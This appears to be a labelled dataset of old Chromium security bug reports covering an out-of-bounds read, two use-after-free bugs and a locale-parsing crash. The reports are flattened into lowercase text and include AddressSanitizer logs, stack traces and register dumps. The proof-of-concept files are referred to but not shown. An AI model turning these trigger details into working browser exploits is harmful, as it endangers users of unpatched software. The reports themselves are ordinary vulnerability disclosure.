indicate os version and service pack level reproduction case please include a demonstration of the security bug such as an attached html or binary file that reproduces the bug when loaded in chrome please make the file as small as possible and remove any content not required to demonstrate the bug for crashes please include the following additional information type of crash tab browser etc crash state see link above stack trace registers exception record client id if relevant see link above	11
oob read in media scaleyuvtorgb32 credit cris asan clusterfuzz bot cluster_fuzz_92 on platform linux chromium revision 106933 webkit revision 98222 mnt/scratch0/chrome/src/out/release/chrome allow-file-access-from-files disable-click-to-play disable-hang-monitor disable-metrics disable-popup-blocking disable-prompt-on-repost enable-desktop-notifications enable-experimental-extension-apis enable-extension-apps enable-extension-timeline-api enable-geolocation enable-indexed-database enable-nacl enable-native-web-workers enable-search-provider-api-v2 enable-video-track force-internal-pdf incognito js-flags expose-gc new-window no-default-browser-check no-first-run no-process-singleton-dialog no-sandbox single-process disable-gpu-plugin disable-gpu-rendering disable-accelerated-compositing disable-webgl disable-accelerated-2d-canvas user-data-dir=/mnt/scratch0/fuzztmp/t91 5911 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t14 0 in media scaleyuvtorgb32 unsigned char const unsigned char const unsigned char const unsigned char int int int int int int int media yuvtype media rotate media scalefilter 1 in webkit_glue videorendererimpl fastpaint media videoframe skcanvas gfx rect const 2 in webkit_glue videorendererimpl paint skcanvas gfx rect const 3 in webkit_glue webmediaplayerproxy paint skcanvas gfx rect const 4 in webkit_glue webmediaplayerimpl paint skcanvas webkit webrect const 5 in webkit webmediaplayerclientimpl paintcurrentframeincontext webcore graphicscontext webcore intrect const 6 in webcore rendervideo paintreplaced webcore paintinfo webcore intpoint const 7 in webcore renderreplaced paint webcore paintinfo webcore intpoint const 8 in webcore renderimage paint webcore paintinfo webcore intpoint const 9 in webcore renderlayer paintlayer webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int 10 in webcore renderlayer paintlayer webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int 11 in webcore renderlayer paintlayer webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int 12 in webcore renderlayer paint webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion unsigned int 13 in webcore frameview paintcontents webcore graphicscontext webcore intrect const 14 in webcore scrollview paint webcore graphicscontext webcore intrect const 15 in webkit webframeimpl paintwithcontext webcore graphicscontext webkit webrect const 16 in webkit webframeimpl paint skcanvas webkit webrect const 17 in webkit webviewimpl paint skcanvas webkit webrect const 18 in renderwidget paintrect gfx rect const gfx point const skia platformcanvas 19 in renderwidget dodeferredupdate 20 in renderwidget invalidationcallback 21 in base subtle taskclosureadapter run 22 in messageloop runtask messageloop pendingtask const 23 in messageloop deferorrunpendingtask messageloop pendingtask const 24 in messageloop dowork 25 in base messagepumpdefault run base messagepump delegate 26 in messageloop runinternal 27 in messageloop run 28 in base thread threadmain 29 in base anonymous namespace threadfunc void base/threading/platform_thread_posix.cc:0 30 in asanthread threadstart usr/local/google/asan/address-sanitizer/asan/asan_thread.cc:102 31 in start_thread build/buildd/eglibc-2.11.1/nptl/pthread_create.c:300 32 in build/buildd/eglibc-2.11.1/misc sysdeps/unix/sysv/linux/x86_64/clone.s:114 is located 99 bytes to the right of 43631-byte region allocated by thread t20 here 1 in media videoframe allocateyuv 2 in media videoframe createframe media videoframe format unsigned long unsigned long base timedelta base timedelta 3 in media ffmpegvideodecodeengine initialize messageloop media videodecodeengine eventhandler media videodecodecontext media videodecoderconfig const 4 in media ffmpegvideodecoder initialize media demuxerstream base callback void const base callback void media pipelinestatistics const const 5 in base internal invoker4 false base internal invokerstorage4 void media ffmpegvideodecoder media demuxerstream base callback void const base callback void media pipelinestatistics const const media ffmpegvideodecoder scoped_refptr media demuxerstream base callback void base callback void media pipelinestatistics const void media ffmpegvideodecoder media demuxerstream base callback void const base callback void media pipelinestatistics const const doinvoke base internal invokerstoragebase 6 in messageloop runtask messageloop pendingtask const 7 in messageloop deferorrunpendingtask messageloop pendingtask const 8 in messageloop dowork 9 in base messagepumpdefault run base messagepump delegate 10 in messageloop runinternal 11 in messageloop run 12 in base thread threadmain 13 in base anonymous namespace threadfunc void base/threading/platform_thread_posix.cc:0 14 in asanthread threadstart usr/local/google/asan/address-sanitizer/asan/asan_thread.cc:102 thread t14 created by t0 here 1 in base anonymous namespace createthread unsigned long bool base platformthread delegate unsigned long base/threading/platform_thread_posix.cc:0 2 in base platformthread create unsigned long base platformthread delegate unsigned long 3 in base thread startwithoptions base thread options const 4 in browserrenderprocesshost init bool 5 in renderviewhost createrenderview std basic_string unsigned short base string16_char_traits std allocator unsigned short const 6 in tabcontents createrenderviewforrendermanager renderviewhost 7 in non-virtual thunk to tabcontents createrenderviewforrendermanager renderviewhost 8 in renderviewhostmanager navigate navigationentry const 9 in tabcontents navigatetoentry navigationentry const navigationcontroller reloadtype 10 in tabcontents navigatetopendingentry navigationcontroller reloadtype 11 in navigationcontroller navigatetopendingentry navigationcontroller reloadtype 12 in navigationcontroller loadentry navigationentry 13 in browser navigate browser navigateparams 14 in browserinit launchwithprofile opentabsinbrowser browser bool std vector browserinit launchwithprofile tab std allocator browserinit launchwithprofile tab const 15 in browserinit launchwithprofile processspecifiedurls std vector gurl std allocator gurl const 16 in browserinit launchwithprofile processstartupurls std vector gurl std allocator gurl const 17 in browserinit launchwithprofile processlaunchurls bool std vector gurl std allocator gurl const 18 in browserinit launchwithprofile launch profile std vector gurl std allocator gurl const bool 19 in browserinit launchbrowser commandline const profile filepath const browserinit isprocessstartup browserinit isfirstrun int 20 in browserinit processcmdlineimpl commandline const filepath const bool profile int browserinit 21 in chromebrowsermainparts premainmessageloopruninternal 22 in chromebrowsermainparts premainmessagelooprun 23 in browsermain mainfunctionparams const 24 in anonymous namespace runnamedprocesstypemain std basic_string char std char_traits char std allocator char const mainfunctionparams const content contentmaindelegate content/app/content_main.cc:0 25 in content contentmain int char const content contentmaindelegate 26 in chromemain 27 in main 28 in libc_start_main build/buildd/eglibc-2.11.1/csu/libc-start.c:258 thread t20 created by t14 here 1 in base anonymous namespace createthread unsigned long bool base platformthread delegate unsigned long base/threading/platform_thread_posix.cc:0 2 in base platformthread create unsigned long base platformthread delegate unsigned long 3 in base thread startwithoptions base thread options const 4 in base thread start 5 in media messageloopfactoryimpl getmessageloop std basic_string char std char_traits char std allocator char const 6 in webkit_glue webmediaplayerimpl initialize webkit webframe bool scoped_refptr webkit_glue webvideorenderer 7 in renderviewimpl createmediaplayer webkit webframe webkit webmediaplayerclient 8 in webkit webmediaplayerclientimpl loadinternal 9 in webcore mediaplayer loadwithnextmediaengine webcore mediaplayerfactory 10 in webcore mediaplayer load wtf string const webcore contenttype const 11 in webcore htmlmediaelement loadresource webcore kurl const webcore contenttype 12 in webcore htmlmediaelement selectmediaresource 13 in webcore htmlmediaelement loadinternal 14 in webcore threadtimers sharedtimerfiredinternal 15 in base subtle taskclosureadapter run 16 in messageloop runtask messageloop pendingtask const 17 in messageloop deferorrunpendingtask messageloop pendingtask const 18 in messageloop dowork 19 in base messagepumpdefault run base messagepump delegate 20 in messageloop runinternal 21 in messageloop run 22 in base thread threadmain 23 in base anonymous namespace threadfunc void base/threading/platform_thread_posix.cc:0 24 in asanthread threadstart usr/local/google/asan/address-sanitizer/asan/asan_thread.cc:102 5911 aborting shadow byte and word fa fa fa fa fa fa fa fa fa more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 07 fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa	11
use-after-free in svg renderer vulnerability details html file with loaded svg file can trigger use-after-free in svg renderer while changing the order of tree nodes version ubuntu 10.10 x64 17.0.923.0 developer build 107869 linux windows 7 x64 15.0.874.106 m reproduction case poc file is in attachment here is an asan log 26413 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore renderobject document const asan_stats.cc:0 1 in webcore renderobject view const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderobject.cpp:2094 2 in webcore rendersvgresourcecontainer markclientforinvalidation webcore renderobject webcore rendersvgresourcecontainer invalidationmode media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/svg/rendersvgresourcecontainer.cpp:134 3 in webcore rendersvgresourcefilter primitiveattributechanged webcore renderobject webcore qualifiedname const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/svg/rendersvgresourcefilter.cpp:344 4 in webcore svgfelightelement svgattributechanged webcore qualifiedname const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svgfelightelement.cpp:199 5 in webcore element setattribute webcore qualifiedname const wtf atomicstring const int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:712 6 in webcore svganimationelement settargetattributeanimatedvalue wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svganimationelement.cpp:359 7 in wtf refptr wtf stringimpl refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 8 in webcore smiltimecontainer updateanimations webcore smiltime double wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/animation/smiltimecontainer.cpp:297 9 in wtf refptr wtf stringimpl refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 10 in webcore threadtimers sharedtimerfiredinternal media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/threadtimers.cpp:118 11 in base subtle taskclosureadapter run media/chromium/chromium/depot_tools/src/base/task.cc:72 12 in messageloop runtask messageloop pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:496 13 in messageloop deferorrunpendingtask messageloop pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:509 14 in messageloop dodelayedwork base timeticks media/chromium/chromium/depot_tools/src/base/message_loop.cc:737 15 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:33 16 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:454 17 in messageloop run media/chromium/chromium/depot_tools/src/base/message_loop.cc:342 18 in renderermain mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:230 19 in anonymous namespace runzygote mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:230 addr2line no such file 20 in anonymous namespace runnamedprocesstypemain std basic_string char std char_traits char std allocator char const mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:267 21 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:445 22 in chromemain media/chromium/chromium/depot_tools/src/chrome/app/chrome_main.cc:32 23 in main media/chromium/chromium/depot_tools/src/chrome/app/chrome_exe_main_gtk.cc:18 24 in libc_start_main build/buildd/eglibc-2.12.1/csu/libc-start.c:258 25 in start 0 is located 16 bytes inside of 272-byte region freed by thread t0 here 0 in free usr/local/google/asan/address-sanitizer/asan/asan_malloc_linux.cc:29 1 in webcore node detach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:1412 2 in webcore element detach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:1029 3 in webcore containernode removebetween webcore node webcore node webcore node media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:499 4 in webcore containernode removechild webcore node int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:474 5 in webcore containernode appendchild wtf passrefptr webcore node int bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:638 6 in webcore containernode insertbefore wtf passrefptr webcore node webcore node int bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:123 7 in webcore node insertbefore wtf passrefptr webcore node webcore node int bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:658 8 in webcore v8node insertbeforecallback v8 arguments const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/custom/v8nodecustom.cpp:70 9 in handleapicallhelper media/chromium/chromium/depot_tools/src/v8/src/builtins.cc:1164 10 in 11 in 12 in 13 in 14 in 15 in 16 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/execution.cc:118 17 in v8 internal isolate handle_scope_implementer media/chromium/chromium/depot_tools/src/v8/src/isolate.h:838 18 in webcore v8proxy instrumentedcallfunction webcore page v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:520 19 in webcore v8proxy callfunction v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:483 20 in webcore v8lazyeventlistener calllistenerfunction webcore scriptexecutioncontext v8 handle v8 value webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8lazyeventlistener.cpp:69 21 in webcore v8abstracteventlistener invokeeventhandler webcore scriptexecutioncontext webcore event v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8abstracteventlistener.cpp:152 22 in webcore v8abstracteventlistener handleevent webcore scriptexecutioncontext webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8abstracteventlistener.cpp:98 23 in webcore eventtarget fireeventlisteners webcore event webcore eventtargetdata wtf vector webcore registeredeventlistener 1ul media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventtarget.cpp:214 24 in webcore eventtarget fireeventlisteners webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventtarget.cpp:199 25 in webcore node handlelocalevents webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:2793 26 in webcore eventdispatcher dispatchevent wtf passrefptr webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatcher.cpp:319 27 in webcore eventdispatchmediator dispatchevent webcore eventdispatcher const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatchmediator.cpp:51 28 in webcore eventdispatcher dispatchevent webcore node wtf passrefptr webcore eventdispatchmediator media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatcher.cpp:55 previously allocated by thread t0 here 0 in malloc usr/local/google/asan/address-sanitizer/asan/asan_malloc_linux.cc:41 1 in webcore svgstyledtransformableelement createrenderer webcore renderarena webcore renderstyle media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svgstyledtransformableelement.cpp:146 2 in webcore noderendererfactory createrenderer media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/noderenderingcontext.cpp:293 3 in webcore noderendererfactory createrendererifneeded media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/noderenderingcontext.cpp:339 4 in webcore node createrendererifneeded media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:1488 5 in webcore element attach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:995 6 in webcore svgstyledelement attach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svgstyledelement.cpp:363 7 in webcore xmldocumentparser startelementns unsigned char const unsigned char const unsigned char const int unsigned char const int int unsigned char const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/xml/parser/xmldocumentparserlibxml2.cpp:792 8 in xmlparsestarttag2 media/chromium/chromium/depot_tools/src/third_party/libxml/src/parser.c:9126 9 in xmlparsetryorfinish media/chromium/chromium/depot_tools/src/third_party/libxml/src/parser.c:10847 10 in xmlparsechunk media/chromium/chromium/depot_tools/src/third_party/libxml/src/parser.c:11625 11 in webcore xmldocumentparser dowrite wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/xml/parser/xmldocumentparserlibxml2.cpp:657 12 in wtf refptr wtf stringimpl refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 13 in webcore decodeddatadocumentparser appendbytes webcore documentwriter char const unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/decodeddatadocumentparser.cpp:50 14 in wtf refptr wtf stringimpl refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 15 in webkit frameloaderclientimpl committedload webcore documentloader char const int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/frameloaderclientimpl.cpp:1115 16 in void wtf derefifnotnull webcore documentloader webcore documentloader media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:59 17 in webcore resourceloader didreceivedata char const int long long bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/resourceloader.cpp:291 18 in void wtf derefifnotnull webcore mainresourceloader webcore mainresourceloader media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:59 19 in webcore resourceloader didreceivedata webcore resourcehandle char const int int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/resourceloader.cpp:442 20 in resourcedispatcher onreceiveddata ipc message const int base filedescriptor int int media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:377 21 in bool resourcemsg_datareceived dispatch resourcedispatcher resourcedispatcher int base filedescriptor int int ipc message const resourcedispatcher resourcedispatcher void resourcedispatcher ipc message const int base filedescriptor int int media/chromium/chromium/depot_tools/src/./content/common/resource_messages.h:137 22 in resourcedispatcher dispatchmessage ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:523 26413 aborting shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 fb fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd	11
use-after-free in dom range use-after-free bug can be triggered when trying to clone range of removed child element version win xp sp3 17.0.932.0 dev-m ubuntu 10.10 x64 17.0.937.0 developer build 109620 linux it does not affects stable beta not tested reproduction case in attachment for crashes please include the following additional information 10045 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore node nodeindex const asan_malloc_linux.cc:0 1 in webcore rangeboundarypoint ensureoffsetisvalid const home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/dom/rangeboundarypoint.h:89 2 in wtf passrefptr webcore range leakref const home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:174 3 in handleapicallhelper home/ams/desktop/lch/depot_tools/src/v8/src/builtins.cc:1178 4 in is located 48 bytes inside of 104-byte region freed by thread t0 here 0 in operator delete void asan_rtl 1 in webcore containernode removechild webcore node int home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:486 2 in webcore range surroundcontents wtf passrefptr webcore node int home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/dom/range.cpp:1559 3 in webcore rangeinternal surroundcontentscallback v8 arguments const home/ams/desktop/lch/depot_tools/src/out/release/obj/gen/webcore/bindings/v8range.cpp:372 4 in handleapicallhelper home/ams/desktop/lch/depot_tools/src/v8/src/builtins.cc:1178 5 in 6 in 7 in 8 in 9 in 10 in 11 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool home/ams/desktop/lch/depot_tools/src/v8/src/execution.cc:118 12 in v8 internal isolate handle_scope_implementer home/ams/desktop/lch/depot_tools/src/v8/src/isolate.h:838 13 in webcore v8proxy instrumentedcallfunction webcore page v8 handle v8 function v8 handle v8 object int v8 handle v8 value home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:509 14 in webcore v8proxy callfunction v8 handle v8 function v8 handle v8 object int v8 handle v8 value home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:472 15 in webcore v8lazyeventlistener calllistenerfunction webcore scriptexecutioncontext v8 handle v8 value webcore event home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8lazyeventlistener.cpp:72 16 in webcore v8abstracteventlistener invokeeventhandler webcore scriptexecutioncontext webcore event v8 handle v8 value home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8abstracteventlistener.cpp:152 17 in v8 context scope scope home/ams/desktop/lch/depot_tools/src/v8/include/v8.h:3497 18 in webcore eventtarget fireeventlisteners webcore event webcore eventtargetdata wtf vector webcore registeredeventlistener 1ul home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/dom/eventtarget.cpp:228 19 in webcore event defaultprevented const home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/dom/event.h:133 20 in webcore node handlelocalevents webcore event home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:2839 21 in wtf passrefptr webcore event operator const home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:83 22 in webcore eventdispatchmediator dispatchevent webcore eventdispatcher const home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatchmediator.cpp:51 23 in webcore eventdispatcher dispatchevent webcore node wtf passrefptr webcore eventdispatchmediator home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatcher.cpp:55 24 in webcore node dispatchevent wtf passrefptr webcore event home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:2853 25 in webcore domwindow dispatchloadevent home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/page/domwindow.cpp:1647 26 in webcore document dispatchwindowloadevent home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:3469 27 in webcore frameloader checkcompleted home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:786 28 in webcore frameloader finishedparsing home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:670 previously allocated by thread t0 here 0 in operator new unsigned long asan_rtl 1 in webcore element create webcore qualifiedname const webcore document home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:115 2 in wtf passrefptr webcore element leakref const home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:174 3 in webcore element cloneelementwithoutattributesandchildren home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:176 4 in wtf passrefptr webcore element leakref const home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:174 5 in wtf passrefptr webcore element leakref const home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:174 6 in webcore containernode clonechildnodes webcore containernode home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:864 7 in webcore element cloneelementwithchildren home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:154 8 in wtf passrefptr webcore node get const home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:78 9 in handleapicallhelper home/ams/desktop/lch/depot_tools/src/v8/src/builtins.cc:1178 10 in 11 in 12 in 13 in 14 in 15 in 16 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool home/ams/desktop/lch/depot_tools/src/v8/src/execution.cc:118 17 in v8 internal isolate handle_scope_implementer home/ams/desktop/lch/depot_tools/src/v8/src/isolate.h:838 18 in webcore v8proxy instrumentedcallfunction webcore page v8 handle v8 function v8 handle v8 object int v8 handle v8 value home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:509 19 in webcore v8proxy callfunction v8 handle v8 function v8 handle v8 object int v8 handle v8 value home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:472 20 in webcore v8lazyeventlistener calllistenerfunction webcore scriptexecutioncontext v8 handle v8 value webcore event home/ams/desktop/lch/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8lazyeventlistener.cpp:72 10045 aborting hint asan does n't collect stats set asan_options=stats=1 or call asan_enable_statistics true stats 0m malloced 0m for red zones by 0 calls stats 0m realloced by 0 calls stats 0m freed by 0 calls stats 0m really freed by 0 calls stats 0m 0 full pages mmaped in 0 calls mmaps by size class mallocs by size class frees by size class rfrees by size class stats malloc large 0 small slow 0 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 00 fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd	11
v8_i18n bcp47toicuformat crash crashes on windows stable 15.0.874.120 108895 dev 17.0.932.0 108826 and canary 17.0.936.1 109705 ca n't reproduce it on linux it does n't crash every time try to open crash1.html in new tab if it not crashes reload does not lead to crash 14d0.15c8 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=00000166 ebx=00b80000 ecx=00001ad0 edx=506c7500 esi=00b81ad1 edi=0000009d eip=644795ac esp=0019e8a8 ebp=0019e968 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 chrome_634f0000 v8_i18n bcp47toicuformat 644795ac 88940d58ffffff mov byte ptr ebp+ecx-0a8h dl ss:0023:001a0390=d0 exceptionaddress 644795ac chrome_634f0000 v8_i18n bcp47toicuformat exceptioncode c0000005 access violation exceptionflags 00000000 numberparameters 2 parameter 0 00000001 parameter 1 001a0390 attempt to write to address 001a0390 childebp retaddr 0019e968 644793bb chrome_634f0000 v8_i18n bcp47toicuformat 0019ebb0 644792f2 chrome_634f0000 v8_i18n languagematcher comparetosupportedlocaleidlist 0019ed0c 64476c19 chrome_634f0000 v8_i18n languagematcher getbestmatchforstring 0019eea8 645c98df chrome_634f0000 v8_i18n locale jslocale 0019ef0c 645c9cb3 chrome_634f0000 v8 internal handleapicallhelper 0 0019efe8 6456ebd5 chrome_634f0000 v8 internal builtin_handleapicall 0019f020 6456f60c chrome_634f0000 v8 internal invoke 0019f058 6453ae57 chrome_634f0000 v8 internal execution call 0019f098 6422faf8 chrome_634f0000 v8 function call 0019f0d8 6422f9bf chrome_634f0000 webcore v8proxy instrumentedcallfunction 0019f10c 64281c48 chrome_634f0000 webcore v8proxy callfunction 0019f148 6418be20 chrome_634f0000 webcore v8eventlistener calllistenerfunction 0019f190 6418bcdf chrome_634f0000 webcore v8abstracteventlistener invokeeventhandler 0019f1d0 6437dba6 chrome_634f0000 webcore v8abstracteventlistener handleevent 0019f200 6437dae3 chrome_634f0000 webcore eventtarget fireeventlisteners 0019f21c 6429c380 chrome_634f0000 webcore eventtarget fireeventlisteners 0019f248 6429c417 chrome_634f0000 webcore domwindow dispatchevent 0019f258 6429c20f chrome_634f0000 webcore domwindow dispatchtimedevent 0019f28c 64365d62 chrome_634f0000 webcore domwindow dispatchloadevent 0019f2b8 641feeaf chrome_634f0000 webcore document implicitclose 0019f2c0 641fedb6 chrome_634f0000 webcore frameloader checkcallimplicitclose 0019f2d4 63cb761b chrome_634f0000 webcore frameloader checkcompleted 0019f308 6418edd0 chrome_634f0000 webkit frameloaderclientimpl dispatchdidfinishdocumentload 0019f310 6418ed94 chrome_634f0000 webcore documentwriter endifnotloadingmainresource 0019f318 64204cc8 chrome_634f0000 webcore documentwriter end 0019f320 6420176e chrome_634f0000 webcore documentloader finishedloading dv v 0019e970 ebp locale_id aa 0019e974 ebp result 0019e8b8 ebp status u_zero_error 0n0 0019e8bc ebp locale_size 0n1698568 0019e8c0 ebp locale char 157 aa chrome_634f0000 v8_i18n bcp47toicuformat 64479596 114184 adc dword ptr ecx-7ch eax 64479599 d275f9 sal byte ptr ebp-7 cl 6447959c 2bce sub ecx esi 6447959e 8d7001 lea esi eax+1 644795a1 8a10 mov dl byte ptr eax 644795a3 40 inc eax 644795a4 84d2 test dl dl 644795a6 75f9 jne chrome_634f0000 v8_i18n bcp47toicuformat 644795a1 644795a8 2bc6 sub eax esi 644795aa 2bc8 sub ecx eax 644795ac 88940d58ffffff mov byte ptr ebp+ecx-0a8h dl 644795b3 8d8550ffffff lea eax ebp-0b0h 644795b9 50 push eax 644795ba 8d8554ffffff lea eax ebp-0ach 644795c0 50 push eax 644795c1 57 push edi	11
